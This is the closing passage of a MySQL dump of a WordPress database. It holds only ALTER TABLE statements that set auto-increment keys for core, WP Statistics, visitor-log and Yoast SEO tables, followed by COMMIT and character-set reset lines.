ALTER TABLE `wp_statistics_visitor`
  MODIFY `ID` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_statistics_visitor_relationships`
--
ALTER TABLE `wp_statistics_visitor_relationships`
  MODIFY `ID` bigint(20) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_termmeta`
--
ALTER TABLE `wp_termmeta`
  MODIFY `meta_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_terms`
--
ALTER TABLE `wp_terms`
  MODIFY `term_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT for table `wp_term_taxonomy`
--
ALTER TABLE `wp_term_taxonomy`
  MODIFY `term_taxonomy_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT for table `wp_usermeta`
--
ALTER TABLE `wp_usermeta`
  MODIFY `umeta_id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=90;

--
-- AUTO_INCREMENT for table `wp_users`
--
ALTER TABLE `wp_users`
  MODIFY `ID` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `wp_wsm_browsers`
--
ALTER TABLE `wp_wsm_browsers`
  MODIFY `id` tinyint(2) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `wp_wsm_countries`
--
ALTER TABLE `wp_wsm_countries`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=250;

--
-- AUTO_INCREMENT for table `wp_wsm_dailyhourlyreport`
--
ALTER TABLE `wp_wsm_dailyhourlyreport`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `wp_wsm_datewise_report`
--
ALTER TABLE `wp_wsm_datewise_report`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_wsm_loguniquevisit`
--
ALTER TABLE `wp_wsm_loguniquevisit`
  MODIFY `id` bigint(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=620;

--
-- AUTO_INCREMENT for table `wp_wsm_logvisit`
--
ALTER TABLE `wp_wsm_logvisit`
  MODIFY `id` bigint(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4633;

--
-- AUTO_INCREMENT for table `wp_wsm_monthlydailyreport`
--
ALTER TABLE `wp_wsm_monthlydailyreport`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_wsm_monthwise_report`
--
ALTER TABLE `wp_wsm_monthwise_report`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_wsm_osystems`
--
ALTER TABLE `wp_wsm_osystems`
  MODIFY `id` tinyint(2) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT for table `wp_wsm_regions`
--
ALTER TABLE `wp_wsm_regions`
  MODIFY `id` tinyint(1) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `wp_wsm_resolutions`
--
ALTER TABLE `wp_wsm_resolutions`
  MODIFY `id` tinyint(2) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- AUTO_INCREMENT for table `wp_wsm_searchengines`
--
ALTER TABLE `wp_wsm_searchengines`
  MODIFY `id` tinyint(2) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `wp_wsm_toolbars`
--
ALTER TABLE `wp_wsm_toolbars`
  MODIFY `id` tinyint(2) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `wp_wsm_url_log`
--
ALTER TABLE `wp_wsm_url_log`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13683;

--
-- AUTO_INCREMENT for table `wp_wsm_yearlymonthlyreport`
--
ALTER TABLE `wp_wsm_yearlymonthlyreport`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_wsm_yearwise_report`
--
ALTER TABLE `wp_wsm_yearwise_report`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_yoast_indexable`
--
ALTER TABLE `wp_yoast_indexable`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=54;

--
-- AUTO_INCREMENT for table `wp_yoast_migrations`
--
ALTER TABLE `wp_yoast_migrations`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT for table `wp_yoast_primary_term`
--
ALTER TABLE `wp_yoast_primary_term`
  MODIFY `id` int(11) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `wp_yoast_seo_links`
--
ALTER TABLE `wp_yoast_seo_links`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=46;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;